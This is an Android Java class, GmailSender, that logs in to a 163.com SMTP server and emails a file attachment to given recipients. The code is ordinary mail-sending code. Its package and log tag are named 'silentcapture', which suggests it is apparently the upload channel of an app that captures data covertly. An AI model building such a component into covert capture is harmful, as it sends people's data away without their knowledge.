package com.test.silentcapture.mail;

import javax.activation.DataHandler;   
import javax.activation.DataSource;  
import javax.activation.FileDataSource;
import javax.activation.MailcapCommandMap;
import javax.activation.CommandMap;
import javax.mail.Message;   
import javax.mail.PasswordAuthentication;   
import javax.mail.Session;   
import javax.mail.Transport;   
import javax.mail.internet.InternetAddress;   
import javax.mail.internet.MimeMessage;  
import javax.mail.internet.MimeMultipart;
import javax.mail.internet.MimeBodyPart;
import javax.mail.BodyPart;
import javax.mail.Multipart;
import javax.mail.SendFailedException;
import javax.mail.MessagingException;
import java.io.ByteArrayInputStream;   
import java.io.IOException;   
import java.io.InputStream;   
import java.io.OutputStream;   
import java.security.Security;   
import java.util.Properties;
import android.util.Log;

import com.test.silentcapture.mail.JSSEProvider;

public class GmailSender extends javax.mail.Authenticator {
    private String mailhost = "smtp.vip.163.com";
    private String user;
    private String password;
    private Session session; 

    static {
        //Security.addProvider(new JSSEProvider());
    }

    public GmailSender(String user, String password) {
        this.user = user;
        this.password = password;

        Properties props = new Properties();
        props.setProperty("mail.transport.protocol", "smtp");
        props.setProperty("mail.host", mailhost);
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.port", "25");
        props.put("mail.smtp.socketFactory.port", "25");
        //props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
        props.put("mail.smtp.socketFactory.fallback", "true");
        props.setProperty("mail.smtp.quitwait", "false");

        session = Session.getDefaultInstance(props, this);
    }

    protected PasswordAuthentication getPasswordAuthentication() {
        return new PasswordAuthentication(user, password);
    }

    /**
     * Send mail.
     * return 1: send mail successfully;
     * return 0: send mail failed, needs to re-send;
     * return < 0: send mail failed, no re-send;
     */
    public synchronized int sendMail(String subject, String body, String sender, String recipients, 
            String attachfile, String attachsubject) {
        try {
            // to add mime type
            MailcapCommandMap mc = (MailcapCommandMap) CommandMap.getDefaultCommandMap();
            mc.addMailcap("text/html;; x-java-content-handler=com.sun.mail.handlers.text_html");
            mc.addMailcap("text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml");
            mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain");
            mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed");
            mc.addMailcap("message/rfc822;; x-java-content-handler=com.sun.mail.handlers.message_rfc822");
            CommandMap.setDefaultCommandMap(mc);


            MimeMessage message = new MimeMessage(session);
            DataHandler handler = new DataHandler(new ByteArrayDataSource(body.getBytes(), "text/plain"));
            message.setSender(new InternetAddress(sender));
            message.setSubject(subject);
            message.setDataHandler(handler);

            // attachment
            Multipart _multipart = new MimeMultipart(); 
            BodyPart messageBodyPart = new MimeBodyPart(); 
            DataSource source = new FileDataSource(attachfile); 
            messageBodyPart.setDataHandler(new DataHandler(source)); 
            messageBodyPart.setFileName(attachfile); 
            _multipart.addBodyPart(messageBodyPart);
            //BodyPart messageBodyPart2 = new MimeBodyPart(); 
            //messageBodyPart2.setText(attachsubject); 
            //_multipart.addBodyPart(messageBodyPart2);

            message.setContent(_multipart);

            if (recipients.indexOf(',') > 0) {
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipients));
            } else {
                message.setRecipient(Message.RecipientType.TO, new InternetAddress(recipients));
            }

            Transport.send(message);
            return 1;
        } catch (SendFailedException e) {
            Log.e("SilentCapture", "GmailSender sendMail met send exception:" + e);
            e.printStackTrace();
            return 0;
        } catch (MessagingException e) {
            Log.e("SilentCapture", "GmailSender sendMail met messaging exception:" + e);
            e.printStackTrace();
            return 0;
        } catch (Exception e) {
            Log.e("SilentCapture", "GmailSender sendMail met an error:" + e);
            e.printStackTrace();
            return -1;
        }
    }

    public class ByteArrayDataSource implements DataSource {
        private byte[] data;
        private String type;

        public ByteArrayDataSource(byte[] data, String type) {
            super();
            this.data = data;
            this.type = type;
        }

        public void setType(String type) {
            this.type = type;
        }

        public String getContentType() {
            if (type == null) {
                return "application/octet-stream";
            } else {
                return type;
            }
        }

        public InputStream getInputStream() throws IOException {
            return new ByteArrayInputStream(data);
        }

        public String getName() {
            return "ByteArrayDataSource";
        }

        public OutputStream getOutputStream() throws IOException {
            throw new IOException("Not Supported");
        }
    }
}
